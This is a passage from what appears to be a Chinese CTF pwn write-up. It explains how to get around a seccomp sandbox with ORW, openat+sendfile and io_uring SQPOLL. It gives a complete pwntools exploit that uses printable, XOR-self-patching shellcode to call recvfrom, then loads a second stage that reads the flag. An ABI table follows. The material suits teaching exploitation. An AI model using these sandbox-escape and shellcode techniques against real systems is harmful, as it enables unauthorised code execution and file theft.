> Note：对于 Seccomp 沙箱的绕过，可以找功能相同或相近的没被禁用系统调用，或者在相应系统调用没有禁用（比如只限制了 `execve` 家族）通过 ORW（open 2 - read 0 - write 1） 或 open_sendfile（open 2 - sendfile 40），这二者除了系统调用使用不同，ORW 需要用户态内存作为 buffer，open_sendfile 直接经过内核读写，另外 open_sendfile 的 shellcode 更短。

> Note: `io_uring` 是 Linux 5.1 内核引入的 I/O 机制。包含三个系统调用：
> `io_uring_setup` 在内核空间创建 SQ 和 CQ 并映射到共享内存
> `io_uring_enter` 从 SQ 向内核提交任务，`flags` 设置 `IORING_ENTER_GETEVENTS` 的情况下阻塞等待内核处理完把结果放进 CQ。
> `io_uring_register` 注册文件和内存缓冲区用于优化性能，另外可以限制 `io_uring` 的权限。
> 如果 `setup` 阶段开启了 `IORING_SETUP_SQPOLL`，内核会开启 `io_uring worker` 线程轮询 SQ，不需要调用 `io_uring_enter`，可以用于绕过沙箱（沙箱只限制当前进程，无法影响内核）。

构造利用链：

程序在读入 shellcode 时限制为可见字符，而正常 openat+sendfile 做不到只包含可见字符（`syscall` 的机器码为 `0f 05` 都不可见）。由于检查可见字符只在 `read` 后进行了一次，可以在执行后再一次读入一个不检查可见字符的 shellcode。只要第一次 `read` 的 shellcode 中调用 `read` 的功能的系统调用即可。由于执行第一次 `read` 的 shellcode 时已经有了 `seccomp` 沙箱限制， `read` 被禁用，可以用 `recvfrom` 绕过。由于调用 `recvfrom`  也需要 `syscall (0f 05)` ，可以在第一个 shellcode 中通过异或修改指令来绕过检测。

整理以下，就是第一次输入 shellcode 中修改指令为 `syscall` 调用 `recvfrom` ，调用时 `recvfrom` 再次读入无可见字符限制的 shellcode 通过 `openat+sendfile` 绕过沙箱。

![[ctf101-pwn1-34.png]]

写脚本拿到 flag： `AAA{alpHa8371cal_sHEILc0D3_C4n't_tr4P_M3b11a4ff28d63}`

exp.py:

```python
#!/usr/bin/env python3
from pwn import *
import time

context(os="linux", arch="amd64", log_level="debug", terminal=["tmux", "split", "-h"])

stage2_code = asm(r"""
		mov edi, -100                 /* AT_FDCWD */
		lea rsi, [rip + flag_rel]
		xor edx, edx                  /* O_RDONLY */
		xor r10d, r10d
		mov eax, 257                  /* SYS_openat */
		syscall
  
		test eax, eax
		jns send_flag

		lea rsi, [rip + flag_abs]
		mov eax, 257
		syscall

	send_flag:
		mov esi, eax                  /* input fd */
		mov edi, 1                    /* stdout / client socket */
		xor edx, edx                  /* offset = NULL */
		mov r10d, 0x100               /* count */
		mov eax, 40                   /* SYS_sendfile */
		syscall

	hang:
		jmp hang

	flag_rel:
		.asciz "flag"
	flag_abs:
		.asciz "/flag"
""")

# 进入 shellcode 时 rbx 是 mmap 返回的 RWX 页地址。该 payload：
# 用 XOR 将 [rbx+0x7c:rbx+0x7e] 的 NOP NOP 改为 0f 05（syscall）；
# 设置 recvfrom(0, rbx, 0x41414141, 0, NULL, NULL) 的寄存器参数；
# 顺着 NOP sled 走到 +0x7c，执行生成的 syscall。

shellcode = (
	b"PX" * 16 +       # 填充至偏移 0x20；AAAA 将位于 [rbx+0x21]
	b"hAAAAZ" +        # rdx = 0x41414141（recvfrom 的 length）
	b"R_" +            # rdi = rdx
	b"3{!" +           # rdi ^= [rbx+0x21]，得到 fd = 0
	b"S^" +            # rsi = rbx，即接收 stage-2 的地址
	b"kK!A" +          # cl = 0x81
	b"2K!" +           # cl ^= 'A'
	b"2K'" +           # cl ^= '_'，得到 0x9f
	b"0K|" +           # 0x90 ^ 0x9f = 0x0f，写入 [rbx+0x7c]
	b"2K!" +           # cl ^= 'A'
	b"2K." +           # cl ^= 'K'，得到 0x95
	b"0K}" +           # 0x90 ^ 0x95 = 0x05，写入 [rbx+0x7d]
	b"RAZ" + b"D3S!" + # r10 = 0（recvfrom flags）
	b"RAX" + b"D3C!" + # r8  = 0（src_addr）
	b"RAY" + b"D3K!" + # r9  = 0（addrlen）
	b"hllllX" +        # 在 [rbx+0x59] 放字符 'l'（0x6c）
	b"RX" +            # rax = rdx
	b"3C!" +           # eax = 0
	b"2C!" +           # al ^= 'A'
	b"2CY"             # al ^= 'l' => 0x2d = SYS_recvfrom
)

assert len(shellcode) == 0x69
assert all(0x21 <= ch <= 0x7e for ch in shellcode)

# recvfrom 从 mmap 页首地址覆写内容；生成的 syscall 位于 +0x7c，
# 执行完后 RIP 在 +0x7e。因此用 NOP 精确填充到 +0x7e。
stage2 = b"\x90" * 0x7e + stage2_code

p = remote("127.0.0.1", 47280)

p.sendlineafter(b"Visible shellcode only:", shellcode)

# 等待 stage-1 执行到 recvfrom，再送含不可见字节的 stage-2。
time.sleep(0.3)
p.send(stage2)

p.interactive()
```

### ABI 差异总结

| 架构           | 参数传递                         | 返回值     | 返回地址                 | 帧指针     |
| ------------ | ---------------------------- | ------- | -------------------- | ------- |
| x86-64       | `rdi,rsi,rdx,rcx,r8,r9`，其余入栈 | `rax`   | `call` 自动压栈；`ret` 弹出 | `rbp`   |
| AArch64      | `x0–x7`，其余入栈                 | `x0/x1` | `bl` 写入 `x30(LR)`    | `x29`   |
| RISC-V（RV64） | `a0–a7`，其余入栈                 | `a0/a1` | `jal` 写入 `ra(x1)`    | `s0/fp` |
| MIPS o32     | `a0–a3`，其余入栈                 | `v0/v1` | `jal/jalr` 写入 $ra    | `s8/fp` |
